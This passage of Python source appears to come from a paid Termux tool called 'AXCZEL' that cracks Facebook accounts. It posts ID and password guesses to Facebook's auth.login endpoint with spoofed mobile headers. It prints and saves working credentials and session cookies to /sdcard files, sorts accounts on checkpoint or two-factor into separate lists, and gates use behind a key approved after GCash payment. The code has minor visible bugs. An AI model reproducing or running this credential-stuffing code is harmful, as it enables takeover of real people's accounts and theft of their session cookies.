                + ";FBDV/XT1045;FBSV/5.1;FBCA/armeabi-v7a:armeabi;]",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
            }
            url = "https://api.facebook.com/method/auth.login"
            twf = (
                "Login approval"
                + "s are on. "
                + "Expect an SMS"
                + " shortly with "
                + "a code to use"
                + " for log in"
            )
            po = requests.post(
                url, data=data, headers=headers, allow_redirects=False
            ).json()
            if "session_key" in po:
                coki = ";".join(
                    i["name"] + "=" + i["value"] for i in po["session_cookies"]
                )
                # get_ffs=requests.get("https://buratski129.pythonanywhere.com/ffs?uid="+ids).json()
                # if "followers" in get_ffs:
                # ffss=get_ffs['followers']
                # else:
                # ffss="API ERROR"
                alive_txt = Panel(
                    "[bold green]AXCZEL-ALIVE\n\n[bold green]USER ID: [bold cyan]"
                    + ids
                    + "\nPASSWORD: [bold cyan]"
                    + pas
                    + "\n[bold green]Followers: [bold cyan]Maintenance\n[bold yellow]FB-LINK: [bold blue]https://www.facebook.com/"
                    + ids
                    + "\n[bold green]DATE: "
                    + date(ids)
                    + "\n[bold green]COOKIE: [bold cyan]"
                    + coki
                    + "[/]",
                    border_style="green",
                    width=60,
                )
                rprint("\n", alive_txt)
                # print('\r\r\033[1;32m [AXCZEL-ALIVE] '+ids+' | '+pas+'\033[1;97m')
                # print(f" \033[1;36mFB LINK: \033[1;34mhttps://www.facebook.com/{ids}")
                # print('\033[1;32m [COOKIES] \033[1;34m'+coki)
                open("/sdcard/AXCZEL-ALIVE.txt",
                     "a").write(ids + "|" + pas + "\n")
                open("/sdcard/AXCZEL-COOKIES.txt", "a").write(
                    ids + "|" + pas + f" >> {coki}\n"
                )
                oks.append(ids)
                break
            elif twf in str(po):
                if "y" in pcp:
                    print("\r\r \033[1;34m[AXCZEL-2F] " + ids + " | " + pas)
                    twf.append(ids)
                    break
            elif "www.facebook.com" in po["error_msg"]:
                if "y" in pcp:
                    print(
                        "\r\r\x1b[38;5;208m [AXCZEL-CP] "
                        + ids
                        + " | "
                        + pas
                        + "\033[1;97m"
                    )
                    open("/sdcard/AXCZEL-DEAD.txt",
                         "a").write(ids + "|" + pas + "\n")
                    cps.append(ids)
                    break
                else:
                    open("/sdcard/AXCZEL-CP.txt",
                         "a").write(ids + "|" + pas + "\n")

                    cps.append(ids)
                    break

            else:
                continue
        loop += 1
    except Exception as e:
        pass


async def sub():
    # r1=str(urlopen("https://pastebin.com/raw/zg0D9N7Y").read())
    key1 = open("/data/data/com.termux/files/usr/bin/.AXCZEL -cov", "r").read()
    clear()
    print(logo)
    async with aiohttp.ClientSession() as sess:
        async with sess.get(
            "https://github.com/secre159/axl/blob/main/approval.txt"
        ) as appro:
            r1 = await appro.text()
            if key1 in r1:
                os.system("clear")
                rprint("[bold green]YOUR KEY IS APPROVED[/]")
                time.sleep(5)
                menu()
            else:
                os.system("clear")
                print("\t \033[1;32m First Get Approval\033[1;37m ")
                time.sleep(5)
                os.system("clear")
                print(logo)
                print("")
                print("YOU HAVE TO GET APPROVAL FIRST BEFORE USING IT")
                print("")
                print(" Your Key is Not Approved ")
                print("")
                print(" MODE OF PAYMENT: GCASH")
                print("")
                print(" Your Key : " + ak + ah + key1)
                print("")
                input(" Press Enter To Send Key")
                time.sleep(3.5)
                os.system("am start https://www.messenger.com/t/axczel.xhan")


try:
    menu()
    asyncio.run(bypass())
except requests.exceptions.ConnectionError:
    print("\n No internet connection ...")
    exit()
except Exception as e:
    print(e)
